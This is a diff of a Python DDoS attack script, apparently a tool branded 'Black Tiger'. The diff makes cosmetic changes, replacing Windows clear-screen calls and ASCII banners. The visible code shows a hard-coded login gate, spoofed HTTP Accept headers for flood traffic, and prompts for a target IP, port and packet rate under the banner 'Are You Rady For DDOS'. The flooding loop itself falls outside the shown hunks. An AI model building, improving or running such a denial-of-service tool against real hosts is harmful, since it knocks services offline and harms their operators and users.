@@ -33,11 +33,12 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-string = os.system("CLS")
-string = os.system("color 2")
+
+string = os.system("clear")
 
 k1 = "BlackTiger"
 t1 = "RabinaIsMyDreamGirl"
+
 print ("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
 print ("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
 print ("░░░██████░░██░░░░░░░█████░░░░░░█████░░░██░░░██░░░░░")
@@ -57,14 +58,13 @@ user1 = input("Input Yo Your UserName : ")
 passcoade = input("Input Your passwoard : ")
 if user1 == k1:
     if passcoade == t1:
-        string = os.system("CLS")
-        print ("███████░░██████░██░░░░██░░█████░░░░██░░░██░")
-        print ("██░░░░░░░░░██░░░░██░░██░░██░░░██░░██░█░█░██")
-        print ("███████░░░░██░░░░░████░░░███████░░██░░█░░██")
-        print ("░░░░░██░░░░██░░░░░░██░░░░██░░░██░░██░░░░░██")
-        print ("███████░░██████░░░░██░░░░██░░░██░░██░░░░░██")
-        print ("        [+] Wellcome Siyam [+]")
-        print ("   [+]  Are You Rady For DDOS [+]")
+        string = os.system("clear")
+        print ("┏┓┏┳━┳┓┏┓┏━━┓")
+        print ("┃┗┛┃━┫┃┃┃┃╭╮┃")
+        print ("┃┏┓┃━┫┗┫┗┫╰╯┃")
+        print ("┗┛┗┻━┻━┻━┻━━┛")
+        print ("[+] Wellcome User")
+        print ("[+] Are You Rady For DDOS")
         ip = str(input('[+] Target: '))
         port = int(input('[+] Port: '))
         pack = int(input('[+] Packet/s: '))
@@ -100,7 +100,7 @@ if user1 == k1:
 
 else :
     #If You Are Not The Member Of Black Tiger
-    string = os.system("CLS")
+    string = os.system("clear")
     print ("██████░░██░░░░░░░█████░░░░░░█████░░░██░░░██░░")
     print ("██░░░██░██░░░░░░██░░░██░░░░██░░░██░░██░███░░░")
     print ("███████░██░░░░░░███████░░░░██░░░░░░░████░░░░░")
